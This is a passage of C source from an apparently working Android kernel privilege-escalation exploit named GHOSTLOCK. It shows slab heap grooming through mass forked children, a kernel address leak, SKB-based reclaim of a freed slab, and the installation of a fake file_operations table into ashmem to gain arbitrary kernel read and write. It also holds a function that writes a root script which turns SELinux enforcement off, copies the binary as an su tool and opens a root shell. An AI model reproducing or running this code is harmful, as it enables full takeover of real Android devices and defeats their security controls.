  put64p(p, FOPS_OFF - pad + FOPS_RELEASE_OFF, text_addr(KIMAGE_TEXT_BASE + CFI_ASHMEM_RELEASE_OFF));
  put64p(p, FOPS_OFF - pad + FOPS_SHOW_FDINFO_OFF, text_addr(KIMAGE_TEXT_BASE + CFI_ASHMEM_SHOW_FDINFO_OFF));
}

int cleanup_page_prepare_state(void) {
  /* recv all SKB vehicles back and diff against the pristine copy to
   * verify the kernel's writes to the fake page. Returns the number of
   * vehicles carrying the STRICT walk signature:
   *   child_pc@SAFE_OFF == (target-8)|1   (rb_erase's child->pc fixup)
   *   + mode 3: scratch@SCRATCH_OFF == page_base+SAFE_OFF (the value store)
   * The walk writes at slab+OFF == recv[OFF] (SKB data starts at block+0);
   * the payload is placed at recv[OFF-pad]. */
  int wrote_vehicles = 0;
  int strict_vehicles = 0;
  uintptr_t exp_child_pc = (pselect_custom_target - 8) | 1;
  uintptr_t exp_scratch = page_base + SAFE_OFF;
  /* mode 4 (FOPS install) writes value=fake_fops, so rb_erase's child->pc
   * fixup lands at FOPS_OFF, not SAFE_OFF. */
  uintptr_t pc_off = (pselect_custom_write == 4) ? FOPS_OFF : SAFE_OFF;
  for (int i = 0; i < skb_vehicles_used; i++) {
    if (skb_sv[i][1] < 0) continue;
    unsigned char *rb = malloc((size_t)ORDER2_SIZE);
    if (!rb) break;
    memset(rb, 0, ORDER2_SIZE);
    ssize_t n = recv(skb_sv[i][1], rb, (size_t)skb_send_size, 0);
    if (n > 0) {
      int diffs = 0;
      if (skb_buf_pristine) {
        for (int j = 0; j < (int)n && diffs < 64; j++) {
          if (rb[j] != skb_buf_pristine[j]) {
            if (diffs == 0)
              pr_info("vehicle[%d] diffs (offset: read vs pristine):", i);
            fprintf(stderr, " %04x:%02x/%02x", j, rb[j], skb_buf_pristine[j]);
            diffs++;
          }
        }
        if (diffs) fputc('\n', stderr);
      }
      if (diffs) {
        wrote_vehicles++;
        uint64_t pc_child, w0_left, w0_right, lock_lm, lock_node, usage,
            scratch, wait_lock, lock_owner, pi_root, pi_lm;
        int pad = skb_pad_off;
        /* walk-address view: the kernel wrote at slab+OFF == recv[OFF] */
        memcpy(&pc_child, rb + pc_off, 8);
        memcpy(&w0_left, rb + W0_OFF + WAITER_TREE_ENTRY_OFF + 0x10, 8);
        memcpy(&w0_right, rb + W0_OFF + WAITER_TREE_ENTRY_OFF + 0x08, 8);
        memcpy(&lock_node, rb + LOCK_OFF + RTMUTEX_WAITERS_OFF, 8);
        memcpy(&lock_lm, rb + LOCK_OFF + RTMUTEX_WAITERS_LM_OFF, 8);
        memcpy(&usage, rb + FAKE_TASK_OFF + TASK_USAGE_OFF, 8);
        memcpy(&scratch, rb + SCRATCH_OFF, 8);
        memcpy(&wait_lock, rb + LOCK_OFF + RTMUTEX_WAIT_LOCK_OFF, 8);
        memcpy(&lock_owner, rb + LOCK_OFF + RTMUTEX_OWNER_OFF, 8);
        memcpy(&pi_root, rb + FAKE_TASK_OFF + TASK_PI_WAITERS_OFF, 8);
        memcpy(&pi_lm, rb + FAKE_TASK_OFF + TASK_PI_WAITERS_LM_OFF, 8);
        /* payload-view: where the pristine fields actually sit */
        uint64_t pv_lm, pv_owner, pv_usage;
        memcpy(&pv_lm, rb + LOCK_OFF - pad + RTMUTEX_WAITERS_LM_OFF, 8);
        memcpy(&pv_owner, rb + LOCK_OFF - pad + RTMUTEX_OWNER_OFF, 8);
        memcpy(&pv_usage, rb + FAKE_TASK_OFF - pad + TASK_USAGE_OFF, 8);
        pr_info("vehicle[%d]: n=%zd pad=%d child_pc=%016llx w0_left=%016llx "
                "w0_right=%016llx lock_root=%016llx lock_leftmost=%016llx "
                "fake_task_usage=%016llx scratch=%016llx wait_lock=%016llx "
                "owner=%016llx pi_root=%016llx pi_lm=%016llx\n",
                i, n, pad, (unsigned long long)pc_child,
                (unsigned long long)w0_left, (unsigned long long)w0_right,
                (unsigned long long)lock_node, (unsigned long long)lock_lm,
                (unsigned long long)usage, (unsigned long long)scratch,
                (unsigned long long)wait_lock, (unsigned long long)lock_owner,
                (unsigned long long)pi_root, (unsigned long long)pi_lm);
        pr_info("vehicle[%d]: payload-view leftmost=%016llx owner=%016llx "
                "usage=%016llx\n",
                i, (unsigned long long)pv_lm, (unsigned long long)pv_owner,
                (unsigned long long)pv_usage);
        /* DIAG: dump the fake fops table slots actually resident in the SKB */
        {
          uint64_t f_owner, f_llseek, f_read, f_write, f_ioctl, f_open;
          memcpy(&f_owner, rb + FOPS_OFF + 0x00, 8);
          memcpy(&f_llseek, rb + FOPS_OFF + FOPS_LLSEEK_OFF, 8);
          memcpy(&f_read, rb + FOPS_OFF + FOPS_READ_OFF, 8);
          memcpy(&f_write, rb + FOPS_OFF + FOPS_WRITE_OFF, 8);
          memcpy(&f_ioctl, rb + FOPS_OFF + FOPS_IOCTL_OFF, 8);
          memcpy(&f_open, rb + FOPS_OFF + FOPS_OPEN_OFF, 8);
          pr_info("vehicle[%d]: FAKE_FOPS owner=%016llx llseek=%016llx "
                  "read=%016llx write=%016llx ioctl=%016llx open=%016llx\n",
                  i, (unsigned long long)f_owner, (unsigned long long)f_llseek,
                  (unsigned long long)f_read, (unsigned long long)f_write,
                  (unsigned long long)f_ioctl, (unsigned long long)f_open);
        }
        int ok_child = (pc_child == exp_child_pc);
        int ok_scratch =
            (pselect_custom_write == 3) ? (scratch == exp_scratch) : 1;
        pr_info("vehicle[%d]: STRICT child_pc=%s scratch=%s (exp child_pc="
                "%016llx exp scratch=%016llx)\n",
                i, ok_child ? "OK" : "MISS", ok_scratch ? "OK" : "MISS",
                (unsigned long long)exp_child_pc,
                (unsigned long long)exp_scratch);
        if (ok_child && ok_scratch) strict_vehicles++;
      }
    }
    free(rb);
    close(skb_sv[i][0]);
    close(skb_sv[i][1]);
    skb_sv[i][0] = skb_sv[i][1] = -1;
  }
  pr_info("cleanup: %d vehicle(s) with diffs, %d with STRICT signature\n",
          wrote_vehicles, strict_vehicles);
  /* release the remaining keeper children (their slabs drain harmlessly
   * now that the route is done) */
  if (v4_keepers) {
    for (int i = 0; i < v4_keeper_cnt; i++) kill_child(v4_keepers[i]);
    free(v4_keepers);
    v4_keepers = NULL;
    v4_keeper_cnt = 0;
  }
  free(skb_buf);
  free(skb_buf_pristine);
  skb_buf = NULL;
  skb_buf_pristine = NULL;
  return strict_vehicles;
}

static int prepare_send_size(void) {
  /* keep the skb head inside kmalloc-16k (order-2): payload + ~0x200
   * overhead must stay <= 16KB so the reclaim hits the freed mm slab */
  skb_send_size = env_int_range("SKB_SEND_SIZE", SKB_SEND_SIZE, 0x1000, ORDER2_SIZE);
  return skb_send_size;
}

static int mm_last_objs;
static int mm_last_nslabs;
/* v9.24: the dip detector polls the sysfs slab counters (~100us) instead
 * of walking /proc/slabinfo (~2-5ms) — the detection read itself was the
 * buddy-steal window that lost the leak slab between the dip and the send
 * (runs 40/43: dip=1 but zero vehicle diffs). */
static int poll_mm_slabs(void) {
  char b[64];
  int aobjs = -1;
  {
    int fd = open("/sys/kernel/slab/mm_struct/objects", O_RDONLY);
    if (fd >= 0) {
      ssize_t r = read(fd, b, sizeof(b) - 1);
      close(fd);
      if (r > 0) {
        b[r] = 0;
        aobjs = atoi(b);
      }
    }
  }
  if (aobjs >= 0) mm_last_objs = aobjs;
  int aslabs = -1;
  {
    int fd = open("/sys/kernel/slab/mm_struct/slabs", O_RDONLY);
    if (fd >= 0) {
      ssize_t r = read(fd, b, sizeof(b) - 1);
      close(fd);
      if (r > 0) {
        b[r] = 0;
        aslabs = atoi(b);
      }
    }
  }
  if (aslabs >= 0) mm_last_nslabs = aslabs;
  if (aslabs < 0 && aobjs < 0) {
    /* fallback: full slabinfo walk */
    static char buf[65536];
    int fd = open("/proc/slabinfo", O_RDONLY);
    if (fd < 0) return -1;
    size_t n = 0;
    for (;;) {
      ssize_t r = read(fd, buf + n, sizeof(buf) - 1 - n);
      if (r <= 0) break;
      n += (size_t)r;
      if (n >= sizeof(buf) - 1) break;
    }
    close(fd);
    if (n == 0) return -2;
    buf[n] = 0;
    char *p = strstr(buf, "mm_struct");
    if (!p) return -3;
    sscanf(p, "mm_struct %d", &aobjs);
    if (aobjs >= 0) mm_last_objs = aobjs;
    char *sd = strstr(p, "slabdata");
    if (!sd) return -4;
    int nslabs = -1;
    sscanf(sd, "slabdata %d %d", &aslabs, &nslabs);
    if (nslabs >= 0) mm_last_nslabs = nslabs;
  }
  return aslabs;
}

/* gate-poll helper: watches the mm cache's slab counts for the leak
 * slab's discard dip. A drop in num_slabs (the TOTAL) means a slab was
 * really DISCARDED (gate fired); an active-only drop means it parked. */
static void gate_poll(int *last, int *dip, int *calm) {
  int cur = poll_mm_slabs();
  int nsl = mm_last_nslabs;
  (void)nsl;
  if (cur >= 0) {
    if (cur < *last) { *dip = 1; *calm = 0; }
    else if (cur == *last) (*calm)++;
    else *calm = 0;
    *last = cur;
  }
}

/* v9.28: settle wait — v9.19 known-good timing (12-round soak + 6 quiet
 * rounds, cap 40 rounds) restored: runs 32/33/36 landed the payload with
 * exactly this. The mm drains + the stack purges must both FULLY stop
 * (objs stable = lazy drains done; o2 stable = stack purges done). */
static void settle_wait(const char *tag, int min_rounds, int quiet_needed,
                        int cap_rounds) {
  int s_rounds = 0;
  int prev_o2 = debug_pagetype_o2(tag);
  poll_mm_slabs();
  int prev_objs = mm_last_objs;
  int quiet = 0;
  for (; s_rounds < cap_rounds; s_rounds++) {
    usleep(500000);
    int cur_o2 = debug_pagetype_o2(tag);
    poll_mm_slabs();
    int cur_objs = mm_last_objs;
    if (cur_o2 >= 0 && cur_o2 == prev_o2 && cur_objs == prev_objs) quiet++;
    else quiet = 0;
    prev_o2 = cur_o2;
    prev_objs = cur_objs;
    if (s_rounds >= min_rounds && quiet >= quiet_needed) break;
  }
  pr_info("v9.14 settle[%s]: %d rounds, o2=%d objs=%d (quiet=%d)\n",
          tag, s_rounds + 1, prev_o2, prev_objs, quiet);
}

uintptr_t prepare_good_kernel_page(void) {
  prepare_send_size();
  int debug_drain = env_flag("GL_DEBUG_DRAIN", 0);
  skb_vehicles_used = env_int_range("GL_VEHICLES", SKB_RECLAIM_SENDS, 8, SKB_RECLAIM_SENDS);

  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) skb_sv[i][0] = skb_sv[i][1] = -1;

  /* V9.6: KILL-ORDER reclaim — no /proc/pid/mem pins (mmfree_probe3
   * proved the pins leak on this kernel: pinned mms never free). The
   * mm_struct frees are LAZY-RCU here (probe2 phase A: exit-time mms
   * freed in a ~10s batch wave; threshold ~100-224 callbacks, executed
   * FIFO). Killing children queues the frees in kill order and the flush
   * wave executes them in that same order, so the old close-order
   * drain/gate design maps 1:1 onto a kill order. The leak child stays
   * ALIVE until the last kill; a trigger squad then pushes the lazy batch
   * over the flush threshold, and a tight slabinfo poll detects the leak
   * slab's discard (the last mm-slab event of the wave) -> IMMEDIATE
   * first send. */
  #define V9_PREPARE_CNT (32 * MM_OBJS_PER_SLAB)
  #define V9_SPRAY_CNT   (13 * MM_OBJS_PER_SLAB)
  #define V9_DUMMY_CNT   450    /* v9.19 known-good (runs 32/33/36 landed with
                                 * this). 450 dummy clones pin ~26 non-empty
                                 * slabs on the node partial list, keeping
                                 * nr_partial >= min_partial(4) so the leak
                                 * slab is DISCARDED (not parked) when it
                                 * empties in phase 3. The v9.30 reduction to
                                 * 200 starved nr_partial and caused the
                                 * dip=0 "leak slab parked" flake.
                                 * (snitch 4096 threads + ~1950 children must
                                 * stay < ulimit 6608.) */
  /* v9.26: 1100 — the phase-1 stack volume (765 flood + 32 pre/post + 1100
   * purge ≈ 30.3MB) crosses the empirically-observed ~29-31MB vmap purge
   * threshold DURING the settle, so the list is drained before phase-3.
   * With 1000 (28.8MB) the settle's quiet passed with the list just below
   * the threshold and phase-3's ~3.2MB crossed it at the gate (+1410 block
   * flood, run 45: leak slab buried -> walk corrupted the reallocated block
   * -> reset at punch 1). */
  /* v9.37: purge squad made runtime-tunable. v9.28's 700 is the "known-good"
   * but round 5-6 empirically showed its kernel-stack vfree purge still
   * bursts at the GATE (o2 +1200..+3200), burying the leak slab -> 0 diffs.
   * Hypothesis: with GL_PURGE_CNT=0 the vmap lazy list stays BELOW the purge
   * threshold, so the flood+dummy kernel stacks stay parked off the buddy and
   * the leak slab (mm_struct discard) is the ONLY order-2 buddy free the SKB
   * has to grab. */
  int purge_cnt = env_int_range("GL_PURGE_CNT", 700, 0, 1100);
  pid_t *flood = calloc((size_t)(V9_PREPARE_CNT + V9_SPRAY_CNT + 64), sizeof(pid_t));
  pid_t *dummy = calloc((size_t)(V9_DUMMY_CNT + 8), sizeof(pid_t));
  pid_t *purge = calloc((size_t)(purge_cnt + 8), sizeof(pid_t));
  if (!flood || !dummy || !purge) {
    free(flood); free(dummy); free(purge); return 0;
  }
  int fcnt = 0;
  pid_t pre[MM_OBJS_PER_SLAB - 1];
  pid_t post[MM_OBJS_PER_SLAB];

  int clone_fail = 0;
  for (int i = 0; i < V9_PREPARE_CNT + V9_SPRAY_CNT; i++) {
    pid_t p = clone_child();
    if (p < 0) clone_fail++;
    else flood[i] = p;
  }
  fcnt = V9_PREPARE_CNT + V9_SPRAY_CNT - clone_fail;
  pr_info("v9.6 diag: flood clones ok=%d fail=%d\n", fcnt, clone_fail);

  for (int i = 0; i < MM_OBJS_PER_SLAB - 1; i++) pre[i] = clone_child();
  int leak_pipe[2];
  pid_t leak_child = 0;
  if (pipe(leak_pipe) != 0) { pr_warning("pipe failed\n"); goto fail; }
  leak_child = fork();
  if (leak_child == 0) {
    close(leak_pipe[0]);
    prctl(PR_SET_PDEATHSIG, SIGKILL);
    uintptr_t mm = kernelsnitch_leak_mm();
    ssize_t w = write(leak_pipe[1], &mm, sizeof(mm));
    (void)w;
    close(leak_pipe[1]);
    for (;;) pause();   /* stays alive — killed LAST in the reclaim order */
  }
  for (int i = 0; i < MM_OBJS_PER_SLAB; i++) post[i] = clone_child();

  /* dummy trigger squad: cloned early (fresh slabs), 1 per slab pinned
   * so the slabs never empty; killed in phase 3 to re-cross the flush
   * threshold after the settle. */
  {
    int dfail = 0;
    int dfirst_err = 0;
    for (int i = 0; i < V9_DUMMY_CNT; i++) {
      errno = 0;
      pid_t p = clone_child();
      if (p < 0) {
        int clone_errno = errno;            /* v9.60: capture BEFORE any syscalls */
        if (!dfirst_err) dfirst_err = clone_errno;
        if (dfail == 0) {
          /* v9.55: dump the actual fork limits at the FIRST clone failure to
           * pin which limit EAGAIN hits (RLIMIT_NPROC vs max_threads vs pid). */
          struct rlimit rl;
          getrlimit(RLIMIT_NPROC, &rl);
          FILE *la = fopen("/proc/loadavg", "r");
          char lab[64] = "?";
          if (la) { fgets(lab, sizeof(lab), la); fclose(la); }
          FILE *tm = fopen("/proc/sys/kernel/threads-max", "r");
          char tmb[32] = "?"; if (tm) { fgets(tmb, sizeof(tmb), tm); fclose(tm); }
          FILE *pm = fopen("/proc/sys/kernel/pid_max", "r");
          char pmb[32] = "?"; if (pm) { fgets(pmb, sizeof(pmb), pm); fclose(pm); }
          /* count tasks we own (uid) via /proc */
          int procs = 0;
          DIR *d = opendir("/proc");
          if (d) { struct dirent *e; while ((e = readdir(d))) if (atoi(e->d_name) > 0) procs++; closedir(d); }
          pr_info("v9.55 fork-limit: RLIMIT_NPROC=%lu/%lu loadavg=%s threads-max=%s pid_max=%s /proc entries=%d errno=%d %s\n",
                  (unsigned long)rl.rlim_cur, (unsigned long)rl.rlim_max,
                  lab, tmb, pmb, procs, clone_errno, strerror(clone_errno));
        }
        dfail++;
      }
      else dummy[i] = p;
    }
    for (int i = 0; i < V9_DUMMY_CNT; i++) {
      if (dummy[i] > 0 && (i % MM_OBJS_PER_SLAB) == (MM_OBJS_PER_SLAB - 1)) {
        int fd = open_memfd(dummy[i]);
        if (fd < 0) dfail++;
        /* fd intentionally never closed — the leaked pin keeps the slab
         * non-empty */
      }
    }
    pr_info("v9.13 diag: dummy clones ok=%d fail=%d (first errno=%d %s)\n",
            V9_DUMMY_CNT - dfail, dfail, dfirst_err, strerror(dfirst_err));
  }

  /* purge squad: 700 more children (pinned 1 per slab) killed in phase 1
   * so the cumulative vmapped-stack list crosses the ~32MB vmap-lazy
   * purge threshold DURING the settle (run 26: the purge fired only in
   * phase 3 — +1456 blocks right at the gate — because the list sat at
   * ~18MB below the threshold through the whole settle). */
  {
    int pfail = 0;
    for (int i = 0; i < purge_cnt; i++) {
      pid_t p = clone_child();
      if (p < 0) pfail++;
      else purge[i] = p;
    }
    for (int i = 0; i < purge_cnt; i++) {
      if (purge[i] > 0 && (i % MM_OBJS_PER_SLAB) == (MM_OBJS_PER_SLAB - 1)) {
        int fd = open_memfd(purge[i]);
        if (fd < 0) pfail++;
        /* fd intentionally never closed — the leaked pin keeps the slab
         * non-empty */
      }
    }
    pr_info("v9.15 diag: purge clones ok=%d fail=%d\n", purge_cnt - pfail, pfail);
  }

  /* strategic pins: keep 1 object per early-flood slab and 1 in the post
   * slab so their kills never produce an empty slab (no discards — the
   * leak slab's discard stays the only order-2 event). The pins leak on
   * this kernel (probe 3), which is exactly what we want. */
  for (int i = 0; i < 12 * MM_OBJS_PER_SLAB; i++) {
    if ((i % MM_OBJS_PER_SLAB) == (MM_OBJS_PER_SLAB - 1)) {
      int fd = open_memfd(flood[i]);
      if (fd < 0) pr_warning("v9.12: flood pin %d failed\n", i);
      /* fd intentionally never closed — the leaked pin keeps the slab
       * non-empty forever */
    }
  }
  {
    int fd = open_memfd(post[MM_OBJS_PER_SLAB - 1]);
    if (fd < 0) pr_warning("v9.12: post pin failed\n");
  }

  close(leak_pipe[1]);
  uintptr_t mm = 0;
  ssize_t r = read(leak_pipe[0], &mm, sizeof(mm));
  close(leak_pipe[0]);

  if (!mm || r != (ssize_t)sizeof(mm)) {
    pr_warning("kernelsnitch mm leak failed (mm=%016zx r=%zd)\n", mm, r);
    goto fail;
  }
  uintptr_t base = mm & ~(ORDER2_SIZE - 1);
  if (base < DIRECT_MAP_BASE || base >= DIRECT_MAP_END) {
    pr_warning("leaked mm out of direct map: %016zx\n", mm);
    goto fail;
  }
  pr_info("leaked mm=%016zx slab base=%016zx\n", mm, base);

  skb_buf = malloc(ORDER2_SIZE);
  if (!skb_buf) goto fail;
  prepare_skb_payload(base);
  skb_buf_pristine = malloc(ORDER2_SIZE);
  if (skb_buf_pristine)
    memcpy(skb_buf_pristine, skb_buf, ORDER2_SIZE);

  /* create the SKB socketpairs now (no order-2 allocation) */
  int ok = 0;
  for (int i = 0; i < skb_vehicles_used; i++) {
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, skb_sv[i]) == 0) ok++;
  }

  int o2_pre = debug_pagetype_o2("pre-kills");

  /* ordered kills (v9.13):
   * PHASE 1 — the builders (nr_partial) + the REST (the flush volume),
   * all killed up front. Their frees drain in ~150-200 batches and their
   * kernel stacks purge in bursts (run 23: a +20-block purge landed
   * EXACTLY in the gate window and buried the leak slab).
   * SETTLE — wait until BOTH streams fully stop (the mm object count
   * stable = the lazy drains done; the o2 stable = the stack purges
   * done), so the phase-3 window is clean.
   * PHASE 3 — pre[0..15] + the LEAK CHILD first (their frees land at the
   * queue's FRONT — the first drain window), then the dummy squad to
   * re-cross the flush threshold. The leak slab's discard is the only
   * slab-count dip; poll interleaved and send immediately after it. */
  for (int i = 0; i < 18 * MM_OBJS_PER_SLAB; i++) {
    if (((12 * MM_OBJS_PER_SLAB + i) % MM_OBJS_PER_SLAB) == (MM_OBJS_PER_SLAB - 1))
      continue;   /* keeper stays alive */
    kill_child(flood[12 * MM_OBJS_PER_SLAB + i]);
  }
  for (int i = 0; i < 12 * MM_OBJS_PER_SLAB; i++) {
    if ((i % MM_OBJS_PER_SLAB) == (MM_OBJS_PER_SLAB - 1)) continue;  /* pinned keeper */
    kill_child(flood[i]);
  }
  for (int i = 30 * MM_OBJS_PER_SLAB; i < fcnt; i++) {
    if ((i % MM_OBJS_PER_SLAB) == (MM_OBJS_PER_SLAB - 1)) continue;  /* keeper */
    kill_child(flood[i]);
  }
  for (int i = 0; i < MM_OBJS_PER_SLAB - 1; i++) kill_child(post[i]);
  /* the purge squad: their stacks push the vmap lazy list over ~32MB so
   * the purge fires inside the settle below */
  for (int i = 0; i < purge_cnt; i++) {
    if ((i % MM_OBJS_PER_SLAB) == (MM_OBJS_PER_SLAB - 1)) continue;  /* pinned */
    kill_child(purge[i]);
  }

  /* settle: the mm drains + the stack purges must both FULLY finish
   * (runs 24/25: the purge stream keeps bursting for 10s+ — the o2
   * jumped +1051 during phase 3 even after a 6.5s settle, burying the
   * leak slab). v9.19 timing restored (12 soak + 6 quiet, 20s cap). */
  /* v9.36: the phase-1 purge bursts (700 purge + 765 flood kernel stacks via
   * the vmap lazy list) keep freeing order-2 slabs for 10s+ and are BURSTY —
   * the old quiet=6 (3s) passed on a lull and phase-3 then saw o2 jump
   * +1200..+1400 right at the gate, burying the leak slab under the purge
   * (observed runs r5/r6: dip=1 but 0 diffs). Require 20 quiet rounds (10s)
   * of BOTH o2 and objs stability so the purge fully drains before phase 3. */
  settle_wait("settle", 12, 20, 60);

  int mm0 = poll_mm_slabs();
  int ob0 = mm_last_objs;
  int last = mm0, dip = 0, calm = 0;
  /* phase-3 trigger FIRST: the dummy squad's mm frees re-cross the flush
   * threshold, and — crucially — their stack vfrees' purge bursts run
   * BEFORE the leak slab's discard (the queue is FIFO: the dummies'
   * callbacks precede the pre+leak's), so the burst blocks land BELOW
   * the leak slab on the buddy LIFO. */
  int dk = env_int_range("GL_DUMMY_KILLS", 0, 0, V9_DUMMY_CNT);
  for (int i = 0; i < dk; i++) {
    if ((i % MM_OBJS_PER_SLAB) == (MM_OBJS_PER_SLAB - 1)) continue;  /* pinned */
    kill_child(dummy[i]);
  }
  /* the pre+leak LAST: the leak slab's frees land at the queue's tail —
   * the drain carrying them runs after the dummy purges */
  for (int i = 0; i < MM_OBJS_PER_SLAB - 1; i++) {
    kill_child(pre[i]);
    if ((i & 3) == 3 || i == MM_OBJS_PER_SLAB - 2) gate_poll(&last, &dip, &calm);
  }
  kill_child(leak_child);
  /* v9.34: the leak slab freezes onto the per-CPU partial chain as it
   * empties (its 17 objects are freed via the FREE_FROZEN fastpath); it is
   * only DISCARDED when a later free overflows the chain (pobjects >
   * cpu_partial) and runs unfreeze_partials. Kill GL_TAIL_KILLS extra dummy
   * children AFTER the leak child so their frees overflow the chain and
   * discard the frozen-empty leak slab (which sits at the chain tail and is
   * therefore discarded FIRST -> buddy LIFO head). Default 0 = legacy order. */
  {
    /* v9.35 FIX: the OLD loop killed CONTIGUOUS dummy children, so a value of
     * 34 only spanned ~2 dummy slabs and only added ~2 to the chain's pobjects
     * — nowhere near cpu_partial(13). Each dummy SLAB's *first* free is the
     * only one that calls put_cpu_partial(drain=1) (the rest go through the
     * FREE_FROZEN fastpath and do NOT bump pobjects), so to overflow the chain
     * we must kill the FIRST child of 14+ DIFFERENT dummy slabs. GL_TAIL_KILLS
     * now means "number of dummy slabs to span" (stride = MM_OBJS_PER_SLAB),
     * not "number of children": 14 is the deterministic minimum for a clean
     * chain (1 leak-slab pobject + 14 first-frees -> old_pobjects 14 > 13). */
    int tail = env_int_range("GL_TAIL_KILLS", 0, 0, 272);
    for (int j = 0; j < tail; j++) {
      int i = dk + j * MM_OBJS_PER_SLAB;   /* first child of slab (dk/17 + j) */
      if (i >= V9_DUMMY_CNT) break;
      kill_child(dummy[i]);
    }
  }
  /* v9.54: poll 10x faster (300us vs 3000us) so the dip is detected within
   * ~300us of the leak slab's discard — the old 3ms poll left a 3ms window for a
   * concurrent order-2 allocation to steal the leak slab (the "SKB grabs it first" flake).
   * Iteration counts scaled up to keep the same ~180ms/~900ms coverage. */
  for (int q = 0; q < 600; q++) {
    usleep(300);
    gate_poll(&last, &dip, &calm);
    if (dip) break;
  }
  /* tail poll: the drain wake carrying the leak slab's discard lands
   * ~20-200ms after the last kill (the kthread wake cadence) */
  for (int q = 0; q < 3000 && !dip; q++) {
    usleep(300);
    gate_poll(&last, &dip, &calm);
  }

  /* IMMEDIATELY grab the buddy head: the first send's kmalloc-16k must be
   * the very next order-2 allocation after the discard so it takes the
   * leak slab (buddy LIFO head). No reads, prints or sleeps in between —
   * a concurrent fork's kernel-stack allocation in this window would steal
   * the leak slab. (v9.24: the pre-send pagetype read was moved BELOW —
   * runs 40/43 showed it reopens the steal window.) */
  {
    int delay = env_int_range("GL_GATE_DELAY_USEC", 0, 0, 1000000);
    if (delay > 0) usleep(delay);
    int sent = 0;
    if (skb_sv[0][0] >= 0 &&
        send(skb_sv[0][0], skb_buf, (size_t)skb_send_size, 0) == skb_send_size)
      sent++;

    /* gate state is printed only AFTER the first send grabbed the buddy
     * head — the print itself reopens the steal window otherwise */
    pr_info("v9.10 gate: mm slabs %d -> %d objs %d -> %d (dip=%d calm=%d)\n",
            mm0, last, ob0, mm_last_objs, dip, calm);

    int o2_post = debug_pagetype_o2("post-first-send");
    pr_info("v9.12 reclaim: o2 %d -> %d across full sequence (gate window "
            "%d -> %d, first-send=%d)\n",
            o2_pre, o2_post, mm0, o2_post, sent);

    for (int i = 1; i < skb_vehicles_used; i++) {
      if (skb_sv[i][0] >= 0 &&
          send(skb_sv[i][0], skb_buf, (size_t)skb_send_size, 0) == skb_send_size)
        sent++;
    }
    pr_info("v9.12 reclaim: %d/%d socketpairs, %d/%d SKB vehicles sent (%d bytes each)\n",
            ok, skb_vehicles_used, sent, skb_vehicles_used, skb_send_size);
    if (debug_drain) debug_pagetype("after-vehicles");
  }

  /* record the still-alive children (the early flood, the post, the late
   * flood's remainder + keepers) so cleanup kills them after the route */
  {
    int nk = fcnt + MM_OBJS_PER_SLAB + V9_DUMMY_CNT + purge_cnt;
    v4_keepers = calloc((size_t)(nk + 8), sizeof(pid_t));
    v4_keeper_cnt = 0;
    if (v4_keepers) {
      for (int i = 0; i < fcnt; i++)
        if (flood[i] > 0) v4_keepers[v4_keeper_cnt++] = flood[i];
      for (int i = 0; i < MM_OBJS_PER_SLAB; i++)
        if (post[i] > 0) v4_keepers[v4_keeper_cnt++] = post[i];
      for (int i = 0; i < V9_DUMMY_CNT; i++)
        if (dummy[i] > 0) v4_keepers[v4_keeper_cnt++] = dummy[i];
      for (int i = 0; i < purge_cnt; i++)
        if (purge[i] > 0) v4_keepers[v4_keeper_cnt++] = purge[i];
    }
  }

  free(flood);
  free(dummy);
  free(purge);
  /* page_base = the slab base itself (SKB data starts at block+0) */
  return base + SKB_DATA_DELTA;

fail:
  if (leak_child > 0) kill_child(leak_child);
  for (int i = 0; i < fcnt; i++) kill_child(flood[i]);
  for (int i = 0; i < MM_OBJS_PER_SLAB - 1; i++) kill_child(pre[i]);
  for (int i = 0; i < MM_OBJS_PER_SLAB; i++) kill_child(post[i]);
  for (int i = 0; i < V9_DUMMY_CNT; i++) kill_child(dummy[i]);
  for (int i = 0; i < purge_cnt; i++) kill_child(purge[i]);
  free(flood);
  free(dummy);
  free(purge);
  return 0;
}

/* ===================== misc ===================== */

void slab_drain(void) {
  for (int wave = 0; wave < 3; wave++) {
    int batch = 200;
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

void write_root_script(void) {
  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) return;
  const char *script =
    "#!/system/bin/sh\n"
    "echo '[+] GHOSTLOCK ROOT: uid='$(id -u)' gid='$(id -g)\n"
    "id\n"
    "echo 0 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "getenforce\n"
    "cp /data/local/tmp/ghostlock_rv101 /data/local/tmp/su_gl 2>/dev/null\n"
    "chmod 755 /data/local/tmp/su_gl 2>/dev/null\n"
    "echo '[+] dropping to root shell'\n"
    "exec /system/bin/sh\n";
  write(sfd, script, strlen(script));
  close(sfd);
}

/* ===================== W2 FOPS route: configfs arbitrary r/w ==============
 * Install fake_fops into ashmem_misc.fops (mode-4 write), then open
 * /dev/ashmem: its .read/.write now go through configfs_*_bin_file, which
 * treat file->private_data (the ashmem_area) as a configfs_buffer whose
 * bin_buffer@0x58 is the arbitrary kernel address. The SET_NAME ioctl writes
 * ashmem_area->name[0..] (== configfs_buffer fields, offset by the 11-byte
 * "dev/ashmem/" prefix). */

int open_ashmem_device(void) {
  return open("/dev/ashmem", O_RDWR | O_CLOEXEC);
}

/* Install fake_fops into ashmem_misc.fops WITHOUT freeing the sprayed page.
 * The fake fops table lives in the reclaimed SKB slab; it MUST stay allocated
 * while /dev/ashmem routes read/write through it. Caller runs the configfs
 * operations, then calls cleanup_page_prepare_state() to release the page. */
int install_fake_fops(uintptr_t target) {
  page_base = prepare_good_kernel_page();
  if (!page_base) return 0;
  pselect_child_node = 1;
  set_pselect_write_mode(target, fake_fops, 4);
  run_main_route_threads();
  clear_pselect_write();
  /* DIAG: MSG_PEEK the first SKB (the one that reclaimed the leak slab) to
   * verify the rb_erase ran — write #2 (child->pc) lands at FOPS_OFF, and the
   * fake_fops->read slot at FOPS_OFF+0x10 must be configfs_read_file.cfi_jt.
   * MSG_PEEK does not consume the datagram, so the fake_fops page stays alive
   * for the subsequent /dev/ashmem open. */
  {
    /* DIAG: MSG_PEEK every SKB vehicle (without consuming them) to find the
     * one the rb_erase write #2 landed in. The reclaim's "first send" is
     * supposed to take the leak slab, but empirically the walk lands in a
